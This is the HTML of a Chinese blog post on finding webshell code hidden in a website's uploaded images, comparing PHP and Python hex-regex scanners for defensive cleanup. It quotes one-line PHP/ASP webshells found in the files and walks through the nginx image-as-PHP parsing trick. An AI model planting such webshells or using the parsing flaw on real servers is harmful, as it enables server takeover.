@@ -1,0 +1,706 @@
+
+ <!DOCTYPE HTML>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>网站图片挂马检测及PHP与python的图片文件恶意代码检测对比 | Walter&#39;s Garden</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="Walter Huang">
+    
+
+    
+    <meta name="description" content="从收到阿里云发出的警告邮件，一系列的验证探索，正视图片木马的危害。使用PHP及python利用正则分别对图片目录进行检索，排查出历史遗留的隐患。">
+<meta name="keywords" content="Python,PHP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网站图片挂马检测及PHP与python的图片文件恶意代码检测对比">
+<meta property="og:url" content="https://backwallkid.github.io/2017-08/php-vs-python-detect-malicious-img.html">
+<meta property="og:site_name" content="Walter&#39;s Garden">
+<meta property="og:description" content="从收到阿里云发出的警告邮件，一系列的验证探索，正视图片木马的危害。使用PHP及python利用正则分别对图片目录进行检索，排查出历史遗留的隐患。">
+<meta property="og:image" content="https://backwallkid.github.io/images/malicious_img_in_hex.png">
+<meta property="og:image" content="https://backwallkid.github.io/images/malicious_img_code.png">
+<meta property="og:image" content="https://backwallkid.github.io/images/malicious_img_vm-jpg-php.png">
+<meta property="og:image" content="https://backwallkid.github.io/images/malicious_img_binkan_query.png">
+<meta property="og:updated_time" content="2017-08-14T06:12:37.233Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="网站图片挂马检测及PHP与python的图片文件恶意代码检测对比">
+<meta name="twitter:description" content="从收到阿里云发出的警告邮件，一系列的验证探索，正视图片木马的危害。使用PHP及python利用正则分别对图片目录进行检索，排查出历史遗留的隐患。">
+<meta name="twitter:image" content="https://backwallkid.github.io/images/malicious_img_in_hex.png">
+
+    
+    <link rel="alternative" href="/atom.xml" title="Walter&#39;s Garden" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/satellite.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/rball.png">
+    <link rel="apple-touch-icon-precomposed" href="/img/rball.png">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/rball.png" alt="Walter&#39;s Garden" title="Walter&#39;s Garden"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Walter&#39;s Garden">Walter&#39;s Garden</a></h1>
+				<h2 class="blog-motto">I love $</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/sitemap.xml">Sitemap</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
+						<input type="hidden" name="q" value="site:backwallkid.github.io">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2017-08/php-vs-python-detect-malicious-img.html" title="网站图片挂马检测及PHP与python的图片文件恶意代码检测对比" itemprop="url">网站图片挂马检测及PHP与python的图片文件恶意代码检测对比</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="Walter Huang" target="_blank" itemprop="author">Walter Huang</a>
+		
+  <p class="article-time">
+    <time datetime="2017-08-14T12:32:00.000Z" itemprop="datePublished"> 发表于 2017-08-14</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+    
+
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">文章目录</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析"><span class="toc-number">2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#检查"><span class="toc-number">3.</span> <span class="toc-text">检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#验证"><span class="toc-number">4.</span> <span class="toc-text">验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤"><span class="toc-number">5.</span> <span class="toc-text">过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP与python相同情况下扫描用时对比"><span class="toc-number">6.</span> <span class="toc-text">PHP与python相同情况下扫描用时对比</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#友情赠送"><span class="toc-number">7.</span> <span class="toc-text">友情赠送</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#总结"><span class="toc-number">8.</span> <span class="toc-text">总结</span></a></li></ol>
+		
+		</div>
+		
+		<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>周一一早网管收到来自阿里云的一堆警告，发现我们维护的一个网站下有数十个被挂马的文件。网管直接关了vsftpd，然后把警告导出邮件给我们。</p>
+<p>取出部分大致如下：</p>
+<table>
+<thead>
+<tr>
+<th>服务器IP/名称</th>
+<th>木马文件路径</th>
+<th>更新时间</th>
+<th>木马类型</th>
+<th>状态(全部) </th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>*.*.*.*</td>
+<td>/path/*144.gif</td>
+<td>2017/8/7 5:53</td>
+<td>Webshell</td>
+<td>待处理</td>
+</tr>
+<tr>
+<td>*.*.*.*</td>
+<td>/path/*132.jpg</td>
+<td>2017/8/7 5:23</td>
+<td>Webshell</td>
+<td>待处理</td>
+</tr>
+<tr>
+<td>*.*.*.*</td>
+<td>/path/*156.txt</td>
+<td>2017/8/7 5:22</td>
+<td>Webshell</td>
+<td>待处理</td>
+</tr>
+<tr>
+<td>*.*.*.*</td>
+<td>/path/*0304.jpg</td>
+<td>2017/8/7 5:22</td>
+<td>木马文件</td>
+<td>待处理</td>
+</tr>
+</tbody>
+</table>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>检查vsftpd后发现之前已经配置了只允许我们公司的ip访问的限制。<br>分析路径后发现，触发警报的文件均为同一路径下。<br>经过分析代码得出结论，只有通过管理端的上传图片功能或者使用管理端编辑器的图像上传功能才能将图片放入此文件夹内。<br>而触发木马警报的文件中有90%是交接前的文件（我们在交接时只验证了代码功能而忽视了图片安全性，<strong>失策</strong>）。</p>
+<h3 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h3><p>path文件夹下，git内（交接之日收到的文件）的待检查加上FTP上（交接之日之后维护上传的文件）一共有1320个，分散在数个层级不等的文件夹内。<br>使用<code>Notepad++</code>检查警告中显示的图片文件后发现，木马类型为<code>Webshell</code>或<code>木马文件</code>的图片或文件内含有恶意代码例如：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;%execute(request(<span class="string">"a"</span>))%&gt;</div><div class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="string">'a'</span>]);<span class="meta">?&gt;</span></div><div class="line"><span class="meta">&lt;?</span>fputs(fopen(<span class="string">"TNT.PHP"</span>,<span class="string">"w"</span>),<span class="string">"&lt;?eval(\$_POST[TNT]);?&gt;"</span>)<span class="meta">?&gt;</span></div><div class="line">&lt;% @Page Language=<span class="string">"Jscript"</span>%&gt;</div><div class="line">&lt;%<span class="keyword">eval</span>(Request.Item[<span class="string">"TNT"</span>],<span class="string">"unsafe"</span>);%&gt;</div></pre></td></tr></table></figure></p>
+<p>使用<code>Notepad++</code>的十六进制模式（需安装插件HEX-Editor）查看<br><img src="/images/malicious_img_in_hex.png" alt="malicious-img"></p>
+<h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>经查询nginx有过由于<a href="https://segmentfault.com/q/1010000000321985" target="_blank" rel="external">配置错误导致的文件上传漏洞</a>，详情见<a href="http://www.cnblogs.com/batsing/p/nginx_bug1_attack.html" target="_blank" rel="external">Nginx文件类型错误解析漏洞</a>。<br>正好我的虚拟机上有nginx立刻来试一下。</p>
+<table>
+<thead>
+<tr>
+<th>虚拟机配置</th>
+<th>版本</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>nginx</td>
+<td>1.10.1</td>
+</tr>
+<tr>
+<td>php</td>
+<td>7.2.0-dev</td>
+</tr>
+</tbody>
+</table>
+<ol>
+<li>首先用画图随便造个图片</li>
+<li>使用<code>Notepad++ Hex-Editor</code>将<code>&lt;?php phpinfo(); ?&gt;</code>插入任意角落。<br><img src="/images/malicious_img_code.png" alt=""></li>
+<li>将此图片传入虚拟机中</li>
+<li>在虚拟机中编辑php的php.ini，将<code>;cgi.fix_pathinfo=1</code>打开</li>
+<li>运行nginx，查看效果<br><img src="/images/malicious_img_vm-jpg-php.png" alt=""></li>
+</ol>
+<p>经过验证可以得出，该nginx的bug是的确存在的。但是根据<a href="http://www.cnblogs.com/batsing/p/nginx_bug1_attack.html" target="_blank" rel="external">Nginx文件类型错误解析漏洞</a>一文中描述，将<code>cgi.fix_pathinfo</code>设为0并不能阻止漏洞的发生。<br>使用扫描读取图片二进制字符的方式，可以预防用户上传该类图片。</p>
+<h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h3><p>先观察了数个被报警的图片，提取了被挂马图片的共同点，放入Notepad++中<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;%a(a)a%&gt;00000</div><div class="line">&lt;?a(a)a?&gt;00000</div><div class="line">&lt;script0000000</div><div class="line">&lt;SCRIPT0000000</div><div class="line">script&gt;0000000</div><div class="line">SCRIPT&gt;0000000</div></pre></td></tr></table></figure></p>
+<p>转成十六进制<br><img src="/images/malicious_img_binkan_query.png" alt=""><br>由此可以得出彼此对应的十六进制</p>
+<table>
+<thead>
+<tr>
+<th>&lt;</th>
+<th>%</th>
+<th>(</th>
+<th>)</th>
+<th>%</th>
+<th>&gt;</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>3c</td>
+<td>25</td>
+<td>28</td>
+<td>29</td>
+<td>25</td>
+<td>3e</td>
+</tr>
+</tbody>
+</table>
+<p>用php递归跑目录并检测二进制文本，随便选了个小一点的文件夹进行尝试。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">osWalk</span><span class="params">($path,$dirs=[])</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">false</span> != ($handle = opendir ( $path ))) &#123;</div><div class="line">        <span class="keyword">while</span> ( <span class="keyword">false</span> !== ($file = readdir ( $handle )) ) &#123;</div><div class="line">            <span class="keyword">if</span> ($file != <span class="string">"."</span> &amp;&amp; $file != <span class="string">".."</span>) &#123;</div><div class="line">                <span class="keyword">if</span>(is_file($path.<span class="string">'\\'</span>.$file))</div><div class="line">                    $dirs[]=$path.<span class="string">'\\'</span>.$file;</div><div class="line">                <span class="keyword">else</span></div><div class="line">                    $dirs=osWalk($path.<span class="string">'\\'</span>.$file,$dirs);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        closedir ( $handle );</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $dirs;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkHex</span><span class="params">($img_path)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (file_exists($img_path)) &#123;</div><div class="line">        $resource = fopen($img_path, <span class="string">'rb'</span>);</div><div class="line">        $fileSize = filesize($img_path);</div><div class="line">        fseek($resource, <span class="number">0</span>); <span class="comment">//把文件指针移到文件的开头</span></div><div class="line">        $hexCode = bin2hex(fread($resource, $fileSize));</div><div class="line">        fclose($resource);</div><div class="line">        <span class="comment">/* 匹配16进制中 &lt;?php ?&gt;|eval|fputs|fwrite */</span></div><div class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/(3c3f706870.*?3f3e)|(6576616c)|(6670757473)|(667772697465)/is"</span>, $hexCode))</div><div class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">        <span class="keyword">else</span></div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$scan_start=microtime(<span class="keyword">true</span>);</div><div class="line">$qsFiles=osWalk(<span class="string">'e:\path_to_image'</span>);</div><div class="line">$scan_end=microtime(<span class="keyword">true</span>);</div><div class="line">$res=[];</div><div class="line">$check_start=microtime(<span class="keyword">true</span>);</div><div class="line"><span class="keyword">foreach</span>($qsFiles <span class="keyword">as</span> $qs)&#123;</div><div class="line">    <span class="keyword">if</span> (checkHex($qs))</div><div class="line">        $res[]=$qs;</div><div class="line">&#125;</div><div class="line">$check_end=microtime(<span class="keyword">true</span>);</div><div class="line"><span class="keyword">echo</span> vsprintf(<span class="string">'文件总数：%d，中标文件：%d&lt;br&gt;扫码时间：%.2f秒，检测时间：%.2f秒&lt;br&gt;'</span>,<span class="keyword">array</span>(</div><div class="line">    count($qsFiles), count($res),</div><div class="line">    $scan_end-$scan_start,</div><div class="line">    $check_end-$check_start</div><div class="line">));</div><div class="line"><span class="comment">//echo implode('&lt;br&gt;',$res);</span></div><div class="line"></div><div class="line"><span class="comment">#文件总数：1320，中标文件：28</span></div><div class="line"><span class="comment">#扫描时间：1.16秒，检测时间：125.50秒</span></div></pre></td></tr></table></figure></p>
+<p>觉得这样查时间有点多，用python也写了一个批量匹配<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python  </span></div><div class="line"><span class="comment"># -*- coding:utf-8 -*- </span></div><div class="line"><span class="keyword">import</span> os,re,time,math;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_hex</span><span class="params">(img_path,p)</span>:</span></div><div class="line">	<span class="keyword">with</span> open(img_path,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</div><div class="line">		content=f.read();</div><div class="line">		f.close();</div><div class="line">	<span class="keyword">if</span> p.search(content.encode(<span class="string">'hex'</span>)):</div><div class="line">		<span class="keyword">return</span> <span class="keyword">True</span>;</div><div class="line">	<span class="keyword">return</span> <span class="keyword">False</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">	<span class="comment">#&lt;?php ?&gt;|eval|fputs|fwrite</span></div><div class="line">	p1=re.compile(<span class="string">'(3c3f706870.*?3f3e)|(6576616c)|(6670757473)|(667772697465)'</span>);</div><div class="line">	scan_start=time.time();</div><div class="line">	total_files=<span class="number">0</span>;total_taged=[];</div><div class="line">	<span class="keyword">for</span> parent,dirname,filenames <span class="keyword">in</span> os.walk(<span class="string">r'E:\path_to_image'</span>):</div><div class="line">		<span class="keyword">for</span> file <span class="keyword">in</span> filenames:</div><div class="line">			img_path=parent+os.path.sep+file;</div><div class="line">			total_files+=<span class="number">1</span>;</div><div class="line">			<span class="keyword">if</span> check_hex(img_path,p1):</div><div class="line">				total_taged.append(img_path);</div><div class="line">	scan_end=time.time();</div><div class="line">	</div><div class="line">	<span class="keyword">print</span> <span class="string">u'扫描完成！总用时:%.2f秒。\r\n总共扫描文件数: %d，中标文件数: %d。'</span>%((scan_end-scan_start),total_files,len(total_taged));</div><div class="line">	<span class="comment">#for tag in total_taged:</span></div><div class="line">	<span class="comment">#	print tag;</span></div><div class="line">	<span class="keyword">print</span> <span class="string">'END'</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</div><div class="line">	main();</div><div class="line">	</div><div class="line"><span class="comment">#扫描完成！总用时:97.24秒。</span></div><div class="line"><span class="comment">#总共扫描文件数: 1320，中标文件数: 28。</span></div></pre></td></tr></table></figure></p>
+<p>在相同的匹配条件下python的速度比php快22.4%。</p>
+<h3 id="PHP与python相同情况下扫描用时对比"><a href="#PHP与python相同情况下扫描用时对比" class="headerlink" title="PHP与python相同情况下扫描用时对比"></a>PHP与python相同情况下扫描用时对比</h3><p>接着又换了一批正则试验了一下，PHP和py匹配出的中标文件数差不多，但是用时py优于PHP。<br>正则组合1：<code>&lt;?php ?&gt;|&lt;% %&gt;|eval</code><br><code>(3c3f706870.*?3f3e)|(3c25.*?253e)|(6576616c)</code></p>
+<table>
+<thead>
+<tr>
+<th>语言</th>
+<th>中标数</th>
+<th>用时(秒) </th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>PHP</td>
+<td>956</td>
+<td>14.81</td>
+</tr>
+<tr>
+<td>python</td>
+<td>958</td>
+<td>11.58</td>
+</tr>
+</tbody>
+</table>
+<p>正则组合2：<code>&lt;?php ?&gt;|&lt;% %&gt;|eval|exec</code><br><code>(3c3f706870.*?3f3e)|(3c25.*?253e)|(6576616c)|(65786563)</code></p>
+<table>
+<thead>
+<tr>
+<th>语言</th>
+<th>中标数</th>
+<th>用时(秒) </th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>PHP</td>
+<td>956</td>
+<td>18.40</td>
+</tr>
+<tr>
+<td>python</td>
+<td>958</td>
+<td>13.85</td>
+</tr>
+</tbody>
+</table>
+<p>正则组合3：<code>&lt;?php ?&gt;|&lt;% %&gt;|eval|exec|write|put</code><br><code>(3c3f706870.*?3f3e)|(3c25.*?253e)|(6576616c)|(65786563)|(7772697465)|(707574)</code></p>
+<table>
+<thead>
+<tr>
+<th>语言</th>
+<th>中标数</th>
+<th>用时(秒) </th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>PHP</td>
+<td>961</td>
+<td>26.74</td>
+</tr>
+<tr>
+<td>python</td>
+<td>963</td>
+<td>17.90</td>
+</tr>
+</tbody>
+</table>
+<h3 id="友情赠送"><a href="#友情赠送" class="headerlink" title="友情赠送"></a>友情赠送</h3><p>使用python获取字符串的十六进制比较方便，只需<br><code>print &#39;string&#39;.encode(&#39;hex&#39;);    #737472696e67</code><br>这里放一点图片恶意代码，若有需要请随意使用</p>
+<table>
+<thead>
+<tr>
+<th>图片恶意代码</th>
+<th>hex</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>\&lt;\?php \?></td>
+<td>3c3f706870.*\?3f3e</td>
+</tr>
+<tr>
+<td>\&lt;\? \?></td>
+<td>3c3f.*\?3f3e</td>
+</tr>
+<tr>
+<td>\&lt;\% \%></td>
+<td>3c25.*\?253e</td>
+</tr>
+<tr>
+<td>exec</td>
+<td>65786563</td>
+</tr>
+<tr>
+<td>eval</td>
+<td>6576616c</td>
+</tr>
+<tr>
+<td>system</td>
+<td>73797374656d</td>
+</tr>
+<tr>
+<td>passthru</td>
+<td>061737374687275</td>
+</tr>
+<tr>
+<td>fputs</td>
+<td>6670757473</td>
+</tr>
+<tr>
+<td>fwrite</td>
+<td>667772697465</td>
+</tr>
+</tbody>
+</table>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过这次突发事件，发现了我们在接手新项目的流程里有很大漏洞，比如不会去检测对方发来的图片有没有什么问题。也幸好有这次的事件提了个醒，举一反三赶紧把手里的项目特别是生产服务器使用nginx的先查了个遍，撸掉一大批中标文件。以后若是新接手项目，一定要<strong>检查一下图片有没有问题</strong>。</p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/Tech/">Tech</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/Python/">Python</a><a href="/tags/PHP/">PHP</a>
+  </div>
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="https://backwallkid.github.io/2017-08/php-vs-python-detect-malicious-img.html" data-title="网站图片挂马检测及PHP与python的图片文件恶意代码检测对比 | Walter&#39;s Garden" data-tsina="1832584894" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+
+<div class="next">
+<a href="/2017-08/python-shallow-copy-and-deep-copy.html"  title="Python 深浅拷贝 (Shallow copy and Deep copy in Python)">
+ <strong>下一篇：</strong><br/> 
+ <span>Python 深浅拷贝 (Shallow copy and Deep copy in Python)
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+
+</div>  
+
+      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">文章目录</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析"><span class="toc-number">2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#检查"><span class="toc-number">3.</span> <span class="toc-text">检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#验证"><span class="toc-number">4.</span> <span class="toc-text">验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤"><span class="toc-number">5.</span> <span class="toc-text">过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP与python相同情况下扫描用时对比"><span class="toc-number">6.</span> <span class="toc-text">PHP与python相同情况下扫描用时对比</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#友情赠送"><span class="toc-number">7.</span> <span class="toc-text">友情赠送</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#总结"><span class="toc-number">8.</span> <span class="toc-text">总结</span></a></li></ol>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
+<aside class="clearfix">
+
+  
+
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">分类</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/Tech/" title="Tech">Tech<sup>11</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">标签</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/PHP/" title="PHP">PHP<sup>4</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Git/" title="Git">Git<sup>4</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Python/" title="Python">Python<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Html-js-css/" title="Html+js+css">Html+js+css<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Tools/" title="Tools">Tools<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Linux/" title="Linux">Linux<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Apache/" title="Apache">Apache<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">友情链接</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="http://www.cnblogs.com/waltersgarden/" target="_blank" title="辅站">辅站</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+  
+
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS 订阅</a>
+</div>
+
+  <div class="weiboshow">
+  <p class="asidetitle">新浪微博</p>
+    <iframe width="100%" height="119" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=119&fansRow=2&ptype=1&speed=0&skin=9&isTitle=1&noborder=1&isWeibo=0&isFans=0&uid=1832584894&verifier=&dpc=1"></iframe>
+</div>
+
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p> Hello ,I&#39;m Walter Huang. <br/>
+			This is my blog.</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		<a href="http://weibo.com/1832584894" target="_blank" class="icon-weibo" title="微博"></a>
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2017 
+		
+		<a href="/about" target="_blank" title="Walter Huang">Walter Huang</a>
+		
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
